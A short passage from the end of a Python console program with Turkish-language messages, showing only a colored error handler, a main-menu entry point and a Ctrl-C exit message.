            print(f"\n{C.R}[!] Hata: {e}{C.END}")
            bekle()

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{C.R}[+] Program sonlandırıldı.{C.END}")
